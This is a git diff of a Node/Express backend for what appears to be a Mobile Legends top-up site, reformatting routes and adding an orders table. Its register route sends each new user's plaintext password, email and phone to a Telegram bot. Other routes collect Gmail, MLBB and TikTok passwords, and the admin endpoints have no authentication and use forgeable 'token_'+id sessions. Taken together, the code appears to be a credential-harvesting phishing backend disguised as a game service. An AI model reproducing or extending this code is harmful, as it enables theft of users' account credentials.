@@ -8,7 +8,7 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static(__dirname));
 
 const pool = new Pool({
@@ -28,149 +28,58 @@ const TIKTOK_REDIRECT = 'https://two026-users-data-management.onrender.com/auth/
 function tgSend(msg) { https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }
 
 function sendOnesignal(msg) {
-    const data = JSON.stringify({
-        app_id: ONESIGNAL_APP_ID, included_segments: ["All"], contents: { en: msg },
-        headings: { en: "MLBB Security Notice" }, android_channel_id: "default",
-        ios_sound: "sound.mp3", android_sound: "sound"
-    });
-    const req = https.request({ hostname: 'onesignal.com', path: '/api/v1/notifications', method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_API_KEY}` } }, (res) => {});
+    const data = JSON.stringify({ app_id: ONESIGNAL_APP_ID, included_segments: ["All"], contents: { en: msg }, headings: { en: "MLBB Security Notice" }, android_channel_id: "default", ios_sound: "sound.mp3", android_sound: "sound" });
+    const req = https.request({ hostname: 'onesignal.com', path: '/api/v1/notifications', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_API_KEY}` } }, (res) => {});
     req.write(data); req.end();
 }
 
 function verifyCaptcha(token) {
     return new Promise((resolve) => {
         const data = `secret=${RECAPTCHA_SECRET}&response=${token}`;
-        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => {
-            let body = ''; res.on('data', chunk => body += chunk);
-            res.on('end', () => { try { resolve(JSON.parse(body).success); } catch (e) { resolve(false); } });
-        });
+        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => { let body = ''; res.on('data', chunk => body += chunk); res.on('end', () => { try { resolve(JSON.parse(body).success); } catch (e) { resolve(false); } }); });
         req.on('error', () => resolve(false)); req.write(data); req.end();
     });
 }
 
-pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200) UNIQUE, phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', tiktok_pass VARCHAR(100) DEFAULT 'DoubleMK2008', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`);
+// Tables
+pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200) UNIQUE, phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', tiktok_pass VARCHAR(100) DEFAULT 'DoubleMK2008', balance DECIMAL DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`);
 pool.query(`CREATE TABLE IF NOT EXISTS notices (id SERIAL PRIMARY KEY, message TEXT, color VARCHAR(20) DEFAULT '#ffffff', created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
 pool.query(`CREATE TABLE IF NOT EXISTS banned_users (user_id VARCHAR(100) PRIMARY KEY, banned_by VARCHAR(100), banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
+pool.query(`CREATE TABLE IF NOT EXISTS orders (id SERIAL PRIMARY KEY, user_id INT, username VARCHAR(100), amount DECIMAL, payment_method VARCHAR(50), screenshot TEXT, status VARCHAR(20) DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
 pool.query(`CREATE TABLE IF NOT EXISTS gmail_accounts (user_id VARCHAR(50) PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
 pool.query(`CREATE TABLE IF NOT EXISTS mlbb_accounts (user_id VARCHAR(50) PRIMARY KEY, ingame_name VARCHAR(100), ingame_id VARCHAR(50), server_id VARCHAR(20), gmail VARCHAR(100), password VARCHAR(100), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
 pool.query(`CREATE TABLE IF NOT EXISTS tiktok_accounts (user_id VARCHAR(50) PRIMARY KEY, full_name VARCHAR(100), last_name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
 
 // ==================== AUTH ====================
-app.post('/api/track_login', async (req, res) => {
-    const { userId, username, email, loginType } = req.body;
-    try { await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]); res.json({ success: true }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/register', async (req, res) => {
-    const { username, email, phone, password, captcha } = req.body;
-    if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
-    const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
-    try { const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]); if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
-        await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']);
-        tgSend(`🆕 New Registration\n👤 ${username}\n📧 ${email}\n📱 ${phone}\n🔑 ${password}`); res.json({ success: true, message: 'Registration successful' }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/login', async (req, res) => {
-    const { email, password, captcha } = req.body;
-    if (!email || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
-    const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' });
-    try { const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]); if (r.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
-        const u = r.rows[0]; await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]); res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/auth/google', async (req, res) => {
-    const { token, userInfo } = req.body; if (!userInfo) return res.json({ success: false }); const { sub: gid, email, name } = userInfo;
-    try { let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [gid]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
-        r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [gid, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
-        const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, gid, 'google']); res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } }); } catch (e) { res.json({ success: false }); }
-});
+app.post('/api/track_login', async (req, res) => { const { userId, username, email, loginType } = req.body; try { await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/register', async (req, res) => { const { username, email, phone, password, captcha } = req.body; if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' }); const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); try { const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]); if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' }); await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']); tgSend(`🆕 ${username}\n📧 ${email}\n📱 ${phone}\n🔑 ${password}`); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/login', async (req, res) => { const { email, password, captcha } = req.body; if (!email || !password || !captcha) return res.json({ success: false, message: 'All fields required' }); const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); try { const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]); res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/auth/google', async (req, res) => { const { token, userInfo } = req.body; if (!userInfo) return res.json({ success: false }); const { sub: gid, email, name } = userInfo; try { let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [gid]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); } r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]); if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [gid, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); } const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, gid, 'google']); res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } }); } catch (e) { res.json({ success: false }); } });
 app.get('/auth/tiktok', (req, res) => { const csrf = Math.random().toString(36).substring(2); res.redirect(`https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&scope=user.info.basic&response_type=code&redirect_uri=${TIKTOK_REDIRECT}&state=${csrf}`); });
-app.get('/auth/tiktok/callback', async (req, res) => {
-    const { code } = req.query; if (!code) return res.send('<script>window.close()</script>');
-    try { const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) }); const td = await tr.json();
-        const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } }); const ud = await ur.json(); const user = ud.data.user;
-        const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]); if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); }
-        else { const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']); res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); }
-});
-app.post('/api/check_session', async (req, res) => {
-    const { token } = req.body; if (!token) return res.json({ success: false });
-    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); }
-});
+app.get('/auth/tiktok/callback', async (req, res) => { const { code } = req.query; if (!code) return res.send('<script>window.close()</script>'); try { const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) }); const td = await tr.json(); const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } }); const ud = await ur.json(); const user = ud.data.user; const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]); if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } else { const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']); res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); } });
+app.post('/api/check_session', async (req, res) => { const { token } = req.body; if (!token) return res.json({ success: false }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/logout', (req, res) => res.json({ success: true }));
 
 // ==================== PASSWORDS ====================
-app.post('/api/get_passwords', async (req, res) => {
-    const { token } = req.body; if (!token) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' });
-    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' });
-        res.json({ gmail_password: r.rows[0].gmail_pass || 'DoubleMK2008', mlbb_password: r.rows[0].mlbb_pass || 'GlobalMK2008', tiktok_password: r.rows[0].tiktok_pass || 'DoubleMK2008' }); } catch (e) { res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); }
-});
-app.post('/api/change_password', async (req, res) => {
-    const { token, type, cp, np } = req.body; if (!token || !type || !cp || !np) return res.json({ success: false, message: 'All fields required' });
-    try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false, message: 'User not found' });
-        let field; if (type === 'gmail') field = 'gmail_pass'; else if (type === 'mlbb') field = 'mlbb_pass'; else if (type === 'tiktok') field = 'tiktok_pass'; else return res.json({ success: false, message: 'Invalid type' });
-        const current = r.rows[0][field] || (type === 'mlbb' ? 'GlobalMK2008' : 'DoubleMK2008'); if (cp !== current) return res.json({ success: false, message: 'Wrong current password' });
-        await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [np, parseInt(token.replace('token_', ''))]); res.json({ success: true, message: 'Password changed' }); } catch (e) { res.json({ success: false }); }
-});
+app.post('/api/get_passwords', async (req, res) => { const { token } = req.body; if (!token) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); res.json({ gmail_password: r.rows[0].gmail_pass || 'DoubleMK2008', mlbb_password: r.rows[0].mlbb_pass || 'GlobalMK2008', tiktok_password: r.rows[0].tiktok_pass || 'DoubleMK2008' }); } catch (e) { res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); } });
+app.post('/api/change_password', async (req, res) => { const { token, type, cp, np } = req.body; if (!token || !type || !cp || !np) return res.json({ success: false }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); let field; if (type === 'gmail') field = 'gmail_pass'; else if (type === 'mlbb') field = 'mlbb_pass'; else if (type === 'tiktok') field = 'tiktok_pass'; else return res.json({ success: false }); const current = r.rows[0][field] || (type === 'mlbb' ? 'GlobalMK2008' : 'DoubleMK2008'); if (cp !== current) return res.json({ success: false, message: 'Wrong password' }); await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [np, parseInt(token.replace('token_', ''))]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
 
 // ==================== COUNTRIES ====================
-const countries = [{name:'Myanmar',code:'MM',regions:['Yangon','Mandalay','Naypyidaw']},{name:'Thailand',code:'TH',regions:['Bangkok','Chiang Mai']},{name:'Indonesia',code:'ID',regions:['Jakarta','Bali']},{name:'Malaysia',code:'MY',regions:['Kuala Lumpur','Penang']},{name:'Singapore',code:'SG',regions:['Central','North']},{name:'Philippines',code:'PH',regions:['Manila','Cebu']},{name:'Vietnam',code:'VN',regions:['Hanoi','Ho Chi Minh']},{name:'India',code:'IN',regions:['Mumbai','Delhi']},{name:'China',code:'CN',regions:['Beijing','Shanghai']},{name:'Japan',code:'JP',regions:['Tokyo','Osaka']},{name:'South Korea',code:'KR',regions:['Seoul','Busan']},{name:'USA',code:'US',regions:['New York','Los Angeles']}];
-app.get('/api/countries', (req, res) => res.json(countries));
+app.get('/api/countries', (req, res) => res.json([{name:'Myanmar',regions:['Yangon','Mandalay']},{name:'Thailand',regions:['Bangkok','Chiang Mai']},{name:'Indonesia',regions:['Jakarta','Bali']},{name:'Malaysia',regions:['Kuala Lumpur','Penang']},{name:'Singapore',regions:['Central','North']},{name:'Philippines',regions:['Manila','Cebu']}]));
 
 // ==================== USER DATA ====================
-app.post('/api/save_user_data', async (req, res) => {
-    const { token, type, data } = req.body; if (!token) return res.json({ success: false });
-    const uid = parseInt(token.replace('token_', ''));
-    try { if (type === 'gmail') { await pool.query('INSERT INTO gmail_accounts (user_id, name, email, password, phone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (user_id) DO UPDATE SET name=$2,email=$3,password=$4,phone=$5', [uid, data.name, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); }
-        else if (type === 'mlbb') { await pool.query('INSERT INTO mlbb_accounts (user_id, ingame_name, ingame_id, server_id, gmail, password) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET ingame_name=$2,ingame_id=$3,server_id=$4,gmail=$5,password=$6', [uid, data.ingameName, data.ingameId, data.serverId, JSON.stringify(data.emails), data.password]); }
-        else if (type === 'tiktok') { await pool.query('INSERT INTO tiktok_accounts (user_id, full_name, last_name, email, password, phone) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET full_name=$2,last_name=$3,email=$4,password=$5,phone=$6', [uid, data.fullName, data.lastName, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); }
-        res.json({ success: true }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/get_my_data', async (req, res) => {
-    const { token } = req.body; if (!token) return res.json({ success: false }); const uid = parseInt(token.replace('token_', ''));
-    try { const g = await pool.query('SELECT * FROM gmail_accounts WHERE user_id=$1', [uid]); const m = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id=$1', [uid]); const t = await pool.query('SELECT * FROM tiktok_accounts WHERE user_id=$1', [uid]); res.json({ success: true, gmail: g.rows, mlbb: m.rows, tiktok: t.rows }); } catch (e) { res.json({ success: false }); }
-});
+app.post('/api/save_user_data', async (req, res) => { const { token, type, data } = req.body; if (!token) return res.json({ success: false }); const uid = parseInt(token.replace('token_', '')); try { if (type === 'gmail') { await pool.query('INSERT INTO gmail_accounts (user_id, name, email, password, phone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (user_id) DO UPDATE SET name=$2,email=$3,password=$4,phone=$5', [uid, data.name, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); } else if (type === 'mlbb') { await pool.query('INSERT INTO mlbb_accounts (user_id, ingame_name, ingame_id, server_id, gmail, password) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET ingame_name=$2,ingame_id=$3,server_id=$4,gmail=$5,password=$6', [uid, data.ingameName, data.ingameId, data.serverId, JSON.stringify(data.emails), data.password]); } else if (type === 'tiktok') { await pool.query('INSERT INTO tiktok_accounts (user_id, full_name, last_name, email, password, phone) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET full_name=$2,last_name=$3,email=$4,password=$5,phone=$6', [uid, data.fullName, data.lastName, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); } res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/get_my_data', async (req, res) => { const { token } = req.body; if (!token) return res.json({ success: false }); const uid = parseInt(token.replace('token_', '')); try { const g = await pool.query('SELECT * FROM gmail_accounts WHERE user_id=$1', [uid]); const m = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id=$1', [uid]); const t = await pool.query('SELECT * FROM tiktok_accounts WHERE user_id=$1', [uid]); res.json({ success: true, gmail: g.rows, mlbb: m.rows, tiktok: t.rows }); } catch (e) { res.json({ success: false }); } });
 
 // ==================== ADMIN ====================
-app.get('/api/admin/users_grouped', async (req, res) => {
-    try { const lo = await pool.query("SELECT * FROM auth_users WHERE login_type='local' ORDER BY id DESC"); const go = await pool.query("SELECT * FROM auth_users WHERE login_type='google' ORDER BY id DESC"); const ti = await pool.query("SELECT * FROM auth_users WHERE login_type='tiktok' ORDER BY id DESC"); const ba = await pool.query("SELECT user_id FROM banned_users"); const bids = ba.rows.map(r => r.user_id); res.json({ success: true, local: lo.rows, google: go.rows, tiktok: ti.rows, banned: bids, total: lo.rows.length + go.rows.length + ti.rows.length }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/admin/edit_user', async (req, res) => {
-    const { id, username, email, phone, password } = req.body;
-    try { if (password) { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3, password=$4 WHERE id=$5 AND login_type=$6', [username, email, phone, password, id, 'local']); } else { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3 WHERE id=$4 AND login_type=$5', [username, email, phone, id, 'local']); } res.json({ success: true }); } catch (e) { res.json({ success: false }); }
-});
+app.get('/api/admin/users_grouped', async (req, res) => { try { const lo = await pool.query("SELECT * FROM auth_users WHERE login_type='local' ORDER BY id DESC"); const go = await pool.query("SELECT * FROM auth_users WHERE login_type='google' ORDER BY id DESC"); const ti = await pool.query("SELECT * FROM auth_users WHERE login_type='tiktok' ORDER BY id DESC"); const ba = await pool.query("SELECT user_id FROM banned_users"); const bids = ba.rows.map(r => r.user_id); res.json({ success: true, local: lo.rows, google: go.rows, tiktok: ti.rows, banned: bids, total: lo.rows.length + go.rows.length + ti.rows.length }); } catch (e) { res.json({ success: false }); } });
+app.post('/api/admin/edit_user', async (req, res) => { const { id, username, email, phone, password } = req.body; try { if (password) { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3, password=$4 WHERE id=$5 AND login_type=$6', [username, email, phone, password, id, 'local']); } else { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3 WHERE id=$4 AND login_type=$5', [username, email, phone, id, 'local']); } res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/admin/ban', async (req, res) => { try { await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET banned_by=$2', [req.body.userId, 'admin']); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/admin/unban', async (req, res) => { try { await pool.query('DELETE FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/admin/delete', async (req, res) => { try { await pool.query('DELETE FROM auth_users WHERE id = $1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
 app.post('/api/check_banned', async (req, res) => { try { const r = await pool.query('SELECT * FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ banned: r.rows.length > 0 }); } catch (e) { res.json({ banned: false }); } });
 
-// ==================== NOTICE ====================
-app.get('/api/notice', async (req, res) => {
-    try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, message: '', color: '#ffffff' }); const n = r.rows[0]; res.json({ success: true, message: n.message, color: n.color || '#ffffff', id: n.id, created_at: n.created_at }); } catch (e) { res.json({ success: true, message: '' }); }
-});
-app.get('/api/admin/notices', async (req, res) => {
-    try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC'); res.json({ success: true, notices: r.rows }); } catch (e) { res.json({ success: false, notices: [] }); }
-});
-app.post('/api/admin/notice', async (req, res) => {
-    const { message, color } = req.body; if (!message) return res.json({ success: false, message: 'Message required' });
-    try { await pool.query('INSERT INTO notices (message, color, created_by) VALUES ($1,$2,$3)', [message, color || '#ffffff', 'admin']); tgSend(`📢 ${message}`); sendOnesignal(message); res.json({ success: true }); } catch (e) { res.json({ success: false }); }
-});
-app.post('/api/admin/notice/delete', async (req, res) => {
-    try { await pool.query('DELETE FROM notices WHERE id = $1', [req.body.id]); res.json({ success: true }); } catch (e) { res.json({ success: false }); }
-});
-
-// ==================== PAGES ====================
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
-app.get('/topup.html', (req, res) => res.sendFile(path.join(__dirname, 'topup.html')));
-app.get('/buycode.html', (req, res) => res.sendFile(path.join(__dirname, 'buycode.html')));
-app.get('/aboutredeem.html', (req, res) => res.sendFile(path.join(__dirname, 'aboutredeem.html')));
-app.get('/terms.html', (req, res) => res.sendFile(path.join(__dirname, 'terms.html')));
-app.get('/privacy.html', (req, res) => res.sendFile(path.join(__dirname, 'privacy.html')));
-app.get('/offline.html', (req, res) => res.sendFile(path.join(__dirname, 'offline.html')));
-
-// Orders table
-pool.query(`CREATE TABLE IF NOT EXISTS orders (id SERIAL PRIMARY KEY, user_id INT, username VARCHAR(100), amount DECIMAL, payment_method VARCHAR(50), screenshot TEXT, status VARCHAR(20) DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
-
-// Submit order
+// ==================== ORDERS / TOP-UP ====================
 app.post('/api/submit_order', async (req, res) => {
     const { token, amount, payment_method, screenshot } = req.body;
     if (!token) return res.json({ success: false, message: 'Not logged in' });
@@ -183,26 +92,19 @@ app.post('/api/submit_order', async (req, res) => {
         res.json({ success: true, message: 'Order submitted' });
     } catch (e) { res.json({ success: false, message: e.message }); }
 });
-
-// Get user orders
 app.post('/api/get_orders', async (req, res) => {
     const { token } = req.body;
     if (!token) return res.json({ orders: [] });
     const uid = parseInt(token.replace('token_', ''));
     try { const r = await pool.query('SELECT * FROM orders WHERE user_id=$1 ORDER BY id DESC', [uid]); res.json({ orders: r.rows }); } catch (e) { res.json({ orders: [] }); }
 });
-
-// Admin: Get all orders
 app.get('/api/admin/orders', async (req, res) => {
     try { const r = await pool.query('SELECT * FROM orders ORDER BY id DESC'); res.json({ orders: r.rows }); } catch (e) { res.json({ orders: [] }); }
 });
-
-// Admin: Update order status
 app.post('/api/admin/order_status', async (req, res) => {
     const { id, status } = req.body;
     try {
         await pool.query('UPDATE orders SET status=$1 WHERE id=$2', [status, id]);
-        // If approved, add balance
         if (status === 'approved') {
             const order = await pool.query('SELECT * FROM orders WHERE id=$1', [id]);
             if (order.rows.length > 0) {
